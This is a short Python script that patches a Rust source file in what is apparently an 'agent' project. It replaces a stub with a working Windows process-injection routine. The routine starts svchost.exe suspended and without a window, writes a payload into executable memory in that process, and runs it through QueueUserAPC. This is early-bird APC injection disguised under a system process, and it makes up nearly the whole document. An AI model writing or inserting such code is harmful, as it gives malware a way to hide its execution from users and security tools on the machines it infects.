with open("agent/src/process_manager.rs", "r") as f:
    c = f.read()

c = c.replace("""#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    // 1. Create suspended
    // 2. Allocate and write memory
    // 3. QueueUserAPC
    // 4. ResumeThread
    Ok(())
}""", """#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
    use winapi::um::winbase::{CREATE_SUSPENDED, CREATE_NO_WINDOW};
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
    use winapi::um::processthreadsapi::QueueUserAPC;
    use winapi::um::handleapi::CloseHandle;

    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // Create suspended "svchost.exe"
        let mut target_proc = b"C:\\\\Windows\\\\System32\\\\svchost.exe\\0".to_vec();
        
        let res = CreateProcessA(
            std::ptr::null(),
            target_proc.as_mut_ptr() as *mut i8, // command line
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );

        if res == 0 {
            return Err(anyhow::anyhow!("CreateProcess suspended failed"));
        }

        let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if remote_mem.is_null() {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err(anyhow::anyhow!("VirtualAllocEx failed"));
        }

        let mut written = 0;
        WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written);

        // QueueUserAPC for the main thread
        let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
        QueueUserAPC(apc_routine, pi.hThread, 0);

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    Ok(())
}""")

with open("agent/src/process_manager.rs", "w") as f:
    f.write(c)

